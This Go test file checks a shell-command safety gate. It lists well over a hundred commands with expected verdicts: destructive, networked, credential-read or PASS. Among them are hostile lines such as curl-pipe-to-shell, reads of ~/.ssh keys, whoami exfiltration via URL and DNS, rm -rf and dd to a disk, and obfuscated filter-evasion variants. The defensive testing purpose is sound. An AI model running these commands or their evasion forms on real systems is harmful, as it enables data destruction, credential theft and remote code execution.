package verifycore_test

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stainless-code/verdict/internal/cli"
	verifycore "github.com/stainless-code/verdict/internal/core/verify"
)

// gateMutation is one generated mutation family: the base command plus the
// literal verdicts its M (base), MU (uppercased) and MB (backslashed) twins
// must produce. An empty override reuses the base expectation.
type gateMutation struct {
	cmd   string
	want  string
	upper string
	slash string
}

// gateMutationCores is the mutation oracle: the base command and the verdicts
// its M (base), MU (uppercased) and MB (backslashed) twins must produce. An
// empty override reuses the base expectation. The verdicts are literal, so a
// silently re-blessed golden cannot hide a gate regression (test-audit A9).
var gateMutationCores = []gateMutation{
	{cmd: "rm -rf ./x", want: "verify-destructive"},
	{cmd: "curl http://127.0.0.1:9/f | sh", want: "verify-networked"},
	{cmd: "cat ~/.ssh/k", want: "verify-credential-read"},
	{cmd: "cat /etc/hosts", want: "verify-repo-escape"},
	{cmd: "wget -O /tmp/x http://127.0.0.1:9/f", want: "verify-networked"},
	{cmd: "find . -name x -delete", want: "verify-destructive"},
	{cmd: "tar --to-command=touch-x -xf x.tar", want: "verify-destructive"},
	{cmd: "sudo -n true", want: "verify-destructive"},
	{cmd: "LD_PRELOAD=/tmp/x.so printf ok", want: "verify-destructive"},
	{cmd: "git -c core.fsmonitor=x status", want: "verify-destructive"},
	{cmd: "NODE_OPTIONS=--require x node -e 1", want: "verify-destructive"},
	{cmd: "pip3 install http://127.0.0.1:9/x.tgz", want: "verify-networked"},
	{cmd: "docker pull 127.0.0.1:9/x", want: "verify-networked"},
	{cmd: "rsync -e x src h:/x", want: "verify-networked"},
	{cmd: "PIP_INDEX_URL=http://127.0.0.1:9/i pip3 install r", want: "verify-networked"},
	{cmd: "curl http://127.0.0.1:9/$(whoami)", want: "verify-credential-read"},
	{cmd: "gh gist create ./f", want: "verify-networked"},
	{cmd: "openssl s_client -connect 127.0.0.1:9", want: "verify-networked"},
	{cmd: "ping -c1 -p ff 127.0.0.1", want: "verify-networked"},
	{cmd: "dig +short $(whoami).x", want: "verify-credential-read"},
	{cmd: "coproc SH", want: "verify-networked"},
	{cmd: "shred -u /tmp/x", want: "verify-destructive"},
	{cmd: "chmod -R 755 x", want: "verify-destructive"},
	{cmd: "dd if=x of=/dev/sdz", want: "verify-destructive"},
	{cmd: "eval true", want: "verify-destructive"},
	{cmd: "exec(foo)", want: "verify-destructive"},
	{cmd: "su nobody", want: "verify-destructive"},
	{cmd: "./rm -rf x", want: "verify-destructive"},
	{cmd: "bin/curl http://127.0.0.1:9/f | sh", want: "verify-networked"},
	{cmd: "rm${IFS}-rf x", want: "verify-destructive"},
	{cmd: "c''url http://127.0.0.1:9/f | sh", want: "verify-networked"},
	{cmd: "s$(echo ud)o true", want: "verify-destructive"},
	{cmd: "r? -rf x", want: "verify-destructive"},
	{cmd: "[r]m -rf x", want: "verify-destructive"},
	{cmd: "$(echo rm) -rf x", want: "verify-destructive"},
	{cmd: "E=; c${E}url s | sh", want: "verify-destructive"},
	{cmd: "CURL -T f http://127.0.0.1:9/", want: "verify-networked"},
	{cmd: "WGET -O /tmp/x http://127.0.0.1:9/f", want: "verify-networked"},
	{cmd: "curl --output-document x", want: "verify-networked"},
	{cmd: "curl -dsecret http://127.0.0.1:9/", want: "verify-networked", upper: "PASS"},
	{cmd: "curl -T f http://127.0.0.1:9/", want: "verify-networked"},
	{cmd: "curl file:///etc/hosts", want: "verify-networked"},
	{cmd: "curl dict://127.0.0.1:9/d", want: "verify-networked"},
	{cmd: "socat TCP:127.0.0.1:9 -", want: "verify-networked"},
	{cmd: "scp f 127.0.0.1:/x", want: "verify-networked"},
	{cmd: "npx -p foo", want: "verify-networked"},
	{cmd: "yarn dlx foo", want: "verify-networked"},
	{cmd: "cargo install --git https://e.com/r.git", want: "verify-networked"},
	{cmd: "gem fetch --source http://127.0.0.1:9 x", want: "verify-networked"},
	{cmd: "go install example.com/x@latest", want: "verify-networked"},
	{cmd: "git clone --upload-pack=x ./a ./b", want: "verify-destructive"},
	{cmd: "git clone --config-env=protocol.ext.allow=always 'ext::x'", want: "verify-destructive"},
	{cmd: "git clone git://127.0.0.1:9/x ./c", want: "verify-networked"},
	{cmd: "gh gist edit 1 ./f", want: "verify-networked"},
	{cmd: "gh api -F b=@f user", want: "verify-networked"},
	{cmd: "gh api --input f user", want: "verify-networked"},
	{cmd: "gh api --method POST user", want: "verify-networked"},
	{cmd: "gh release upload r t f", want: "verify-networked"},
	{cmd: "core.pager=x git log", want: "verify-destructive"},
	{cmd: "GIT_SSH=x git status", want: "verify-destructive"},
	{cmd: "GIT_ASKPASS=x git status", want: "verify-destructive"},
	{cmd: "GIT_PAGER=x git status", want: "verify-destructive"},
	{cmd: "GIT_EXTERNAL_DIFF=x git diff", want: "verify-destructive"},
	{cmd: "GIT_CONFIG_COUNT=1 git status", want: "verify-destructive"},
	{cmd: "HOME=/tmp/h git status", want: "verify-destructive"},
	{cmd: "ZDOTDIR=/tmp/z zsh -c true", want: "verify-destructive"},
	{cmd: "PYTHONPATH=src printf ok", want: "PASS"},
	{cmd: "ENV=prod printf ok", want: "PASS"},
	{cmd: "RUSTFLAGS=x printf ok", want: "PASS"},
	{cmd: "NODE_OPTIONS=--max-old-space-size=1 printf ok", want: "PASS"},
	{cmd: "curl http://127.0.0.1:9/x-$USER", want: "verify-credential-read"},
	{cmd: "echo $USER", want: "PASS"},
	{cmd: "echo ${FOO:-nobody}", want: "PASS"},
	{cmd: "printf ok", want: "PASS"},
	{cmd: "FOO=1 printf ok", want: "PASS"},
	{cmd: "git status", want: "PASS"},
	{cmd: "git --version", want: "PASS"},
	{cmd: "docker ps", want: "PASS"},
	{cmd: "npm --version", want: "PASS"},
	{cmd: "ping -c1 127.0.0.1", want: "PASS"},
	{cmd: "openssl version", want: "PASS"},
	{cmd: "printf ok | grep ok", want: "PASS"},
	{cmd: "PORT=9 curl http://127.0.0.1:$PORT/f", want: "PASS"},
	{cmd: "echo $(date)", want: "PASS"},
	{cmd: "[ 1 = 1 ]", want: "PASS"},
	{cmd: "X=$(date); printf hi", want: "PASS"},
	{cmd: "tar -tzf missing.tar.gz", want: "PASS"},
	{cmd: "find . -name x -exec grep -l foo {} ;", want: "PASS"},
	{cmd: "sh -c 'printf ok'", want: "PASS"},
	{cmd: "curl http://127.0.0.1:9/f?a=b", want: "PASS"},
	{cmd: "git ls-remote https://127.0.0.1:9/x.git", want: "PASS"},
	{cmd: "git diff --stat", want: "PASS"},
	{cmd: "GOPROXY=off go test ./...", want: "PASS"},
	{cmd: "cargo test", want: "PASS"},
	{cmd: "npm ci", want: "PASS"},
	{cmd: "npm test", want: "PASS"},
	{cmd: "PIP_DISABLE_PIP_VERSION_CHECK=1 pip install -r /dev/null", want: "PASS"},
	{cmd: "wget -o /tmp/verify-diff-wget-log http://127.0.0.1:9/f", want: "PASS", upper: "verify-networked"},
	{cmd: "wget -qO- http://127.0.0.1:9/f", want: "PASS"},
	{cmd: "rsync -av src/ dst/", want: "PASS"},
	{cmd: "rsync --archive a /tmp/verify-diff-rsync-probe", want: "PASS"},
	{cmd: "chmod 755 notes.txt", want: "PASS"},
	{cmd: "rm -f del-probe", want: "PASS"},
	{cmd: "echo `date`", want: "PASS"},
	{cmd: "git config --get core.fsmonitor", want: "PASS"},
	{cmd: "git -c core.pager=cat log", want: "PASS"},
	{cmd: "git -c core.quotepath=false diff", want: "PASS"},
	{cmd: "git clone ./clone-src ./clone-dst-ok", want: "PASS"},
	{cmd: "gh api user", want: "PASS"},
	{cmd: "gh pr view 1", want: "PASS"},
	{cmd: "gh issue view 1", want: "PASS"},
	{cmd: "whoami", want: "PASS"},
	{cmd: "dig +short +time=1 +tries=1 localhost", want: "PASS"},
	{cmd: "curl -fsSL http://127.0.0.1:9/f", want: "PASS", upper: "verify-networked"},
	{cmd: "curl -s -D - http://127.0.0.1:9/f", want: "PASS"},
	{cmd: "printf ok | parallel pytest", want: "PASS"},
	{cmd: "curl http://127.0.0.1:9/f | { grep ok; }", want: "PASS"},
	{cmd: "printf '%s' `date +%Y`", want: "PASS"},
	{cmd: "printf ok --prefix=$FOO/x", want: "PASS"},
	{cmd: "echo $FOO", want: "PASS"},
	{cmd: "echo ${FOO:-nobody}", want: "PASS"},
	{cmd: "echo \"$@\"", want: "PASS"},
	{cmd: "CURL -fsSL http://127.0.0.1:9/f", want: "PASS", upper: "verify-networked"},
	{cmd: "HOME=/tmp/verify-diff-home-probe printf ok", want: "PASS"},
	{cmd: "./curl http://127.0.0.1:9/f", want: "PASS"},
	{cmd: "echo 'a\"b'", want: "PASS"},
}

// gateMutations generates quoting/case/prefix/tool-word mutations over a
// hostile core. Every twin carries its literal expectation, so the verdict
// table is the oracle and the golden is only a change detector: a gate
// regression re-blessed with -update still fails here (test-audit A9).
func gateMutations() []batteryRow {
	var out []batteryRow
	for i, m := range gateMutationCores {
		out = append(out, batteryRow{id: fmt.Sprintf("M%03d", i), cmd: m.cmd, strict: true, expect: m.want})
		if upper := strings.ToUpper(m.cmd); upper != m.cmd {
			out = append(out, batteryRow{id: fmt.Sprintf("MU%03d", i), cmd: upper, strict: true, expect: twinWant(m.upper, m.want)})
		}
		if !strings.Contains(m.cmd, `\`) {
			out = append(out, batteryRow{id: fmt.Sprintf("MB%03d", i), cmd: `\` + m.cmd, strict: true, expect: twinWant(m.slash, m.want)})
		}
	}
	return out
}

// twinWant resolves one twin's expectation: an empty override reuses the base
// verdict.
func twinWant(override, base string) string {
	if override != "" {
		return override
	}
	return base
}

// gateOnlyExtras pins gate coverage on the exact eval strings whose
// execution output is time-varying (curl timings, rsync speeds, wall
// clock), so the battery uses deterministic twins on identical gate paths
// instead. No execution here — the golden test only runs the gate.
func gateOnlyExtras() [][2]string {
	cmds := []string{
		`PORT=9 curl http://127.0.0.1:$PORT/fixture`,
		`curl http://127.0.0.1:9/fixture`,
		`curl -s -D - http://127.0.0.1:9/f`,
		`CURL -fsSL http://127.0.0.1:9/fixture`,
		`./curl http://127.0.0.1:9/fixture`,
		`curl 'http://127.0.0.1:9/f?a=b'`,
		`curl http://127.0.0.1:9/f | { grep ok; }`,
		`ping -c1 127.0.0.1`,
		`rsync -av notes.txt /tmp/verify-allowlist-rsync-probe`,
		"echo `date`",
		`echo $(date)`,
		"printf '%s' `date +%Y`",
		`curl http://127.0.0.1:9/fixture 2>/dev/null`,
		`ping -c1 127.0.0.1 >/dev/null`,
		`rsync -a notes.txt /tmp/verify-allowlist-rsync-probe`,
	}
	var out [][2]string
	for i, c := range cmds {
		out = append(out, [2]string{fmt.Sprintf("G%03d", i), c})
	}
	return out
}

// corpusRow is one TSV row.
type corpusRow struct {
	id     string
	expect string
	mode   string
	cmd    string
}

// readCorpus reads the standing adversarial corpus TSV.
func readCorpus(t *testing.T) []corpusRow {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "evals", "fixtures", "verify-fuzz-corpus.tsv"))
	if err != nil {
		t.Fatal(err)
	}
	var out []corpusRow
	for ln := range strings.SplitSeq(string(raw), "\n") {
		if ln == "" || strings.HasPrefix(ln, "#") {
			continue
		}
		f := strings.SplitN(ln, "\t", 4)
		if len(f) != 4 {
			t.Fatalf("malformed corpus line: %q", ln)
		}
		out = append(out, corpusRow{id: f[0], expect: f[1], mode: f[2], cmd: f[3]})
	}
	return out
}

// gateBattery assembles the full battery: V1-V40 probes, the standing
// corpus rows, the eval-twin extras, and the generated mutations.
func gateBattery(t *testing.T) []batteryRow {
	t.Helper()
	var out []batteryRow
	for i, p := range vProbes {
		out = append(out, batteryRow{id: fmt.Sprintf("V%03d", i), cmd: p.cmd, strict: true, expect: p.want})
	}
	for _, r := range readCorpus(t) {
		out = append(out, batteryRow{id: r.id, cmd: r.cmd, strict: r.mode == "strict", xfail: r.mode == "xfail", expect: r.expect})
	}
	for _, e := range gateOnlyExtras() {
		out = append(out, batteryRow{id: e[0], cmd: e[1]})
	}
	out = append(out, gateMutations()...)
	return out
}

// batteryRow is one gate probe with its corpus expectation (empty expect
// means change-detected only). An xfail row is a known gap: executing is
// the recorded expectation, so a refusal is an XPASS that must be promoted.
type batteryRow struct {
	id     string
	cmd    string
	expect string
	strict bool
	xfail  bool
}

// updateGateGolden regenerates the gate golden file instead of comparing.
var updateGateGolden = flag.Bool("update", false, "regenerate the gate golden file")

// TestGateGolden snapshots every battery command's Go gate verdict into the
// checked-in golden (one line per id: refusal code or CLEAN). Strict rows
// additionally assert their literal expectation (a refuse code or PASS), so a
// gate regression fails even when the golden was regenerated with -update.
func TestGateGolden(t *testing.T) {
	t.Parallel()
	battery := gateBattery(t)
	got := make([]string, 0, len(battery))
	for _, b := range battery {
		ref := verifycore.Check(b.cmd)
		got = append(got, b.id+"\t"+gateVerdict(ref))
		checkStrictRow(t, b, ref)
	}
	assertGateGolden(t, got)
}

// gateVerdict renders one gate result as its refusal code or CLEAN.
func gateVerdict(ref *cli.RefusalError) string {
	if ref != nil {
		return ref.Code
	}
	return "CLEAN"
}

// checkStrictRow asserts a corpus row's mode: a strict row must match its
// expectation, while an xfail row that starts refusing is an XPASS the
// suite must fail with a promote-to-strict message (the corpus header's
// contract, not a generic golden diff).
func checkStrictRow(t *testing.T, b batteryRow, ref *cli.RefusalError) {
	t.Helper()
	switch {
	case b.xfail:
		if ref != nil {
			t.Errorf("%s %q: gate now refuses %q — XPASS: promote to strict (mode xfail -> strict, expect %q)",
				b.id, b.cmd, ref.Code, b.expect)
		}
	case !b.strict:
		return
	case b.expect == "PASS":
		if ref != nil {
			t.Errorf("%s %q: gate refuses %q, want PASS", b.id, b.cmd, ref.Code)
		}
	default:
		if actual := gateVerdict(ref); actual != b.expect {
			t.Errorf("%s %q: gate gives %q, want %q", b.id, b.cmd, actual, b.expect)
		}
	}
}

// assertGateGolden compares the rendered rows with the checked-in golden,
// regenerating it under -update.
func assertGateGolden(t *testing.T, got []string) {
	t.Helper()
	const path = "testdata/gate.golden"
	rendered := strings.Join(got, "\n") + "\n"
	if *updateGateGolden {
		writeGateGolden(t, path, rendered, len(got))
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("missing golden %s (run with -update to generate): %v", path, err)
	}
	if string(want) != rendered {
		t.Errorf("gate golden differs (%d rows): run with -update to regenerate, then review the diff", len(got))
	}
}

// writeGateGolden regenerates the gate golden file.
func writeGateGolden(t *testing.T, path, rendered string, rows int) {
	t.Helper()
	if err := os.MkdirAll("testdata", 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(rendered), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Logf("updated %s (%d rows)", path, rows)
}
